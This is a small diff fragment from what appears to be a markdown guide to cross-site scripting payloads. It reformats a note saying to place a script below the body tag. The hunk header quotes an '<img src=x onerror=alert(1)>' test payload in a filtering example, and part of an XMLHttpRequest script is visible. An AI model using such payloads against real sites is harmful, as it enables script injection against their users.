@@ -39,8 +39,8 @@ Filtering : <img src=x onerror=alert(1)> -- becomes --> &lt;img src=x onerror=al
       xhttp.send();
    </script>
    ```
-   ### NOTE
-       Put the code above below the body tag
+
+   * NOTE : Put the code above below the body tag
        
        ```html
        <html>
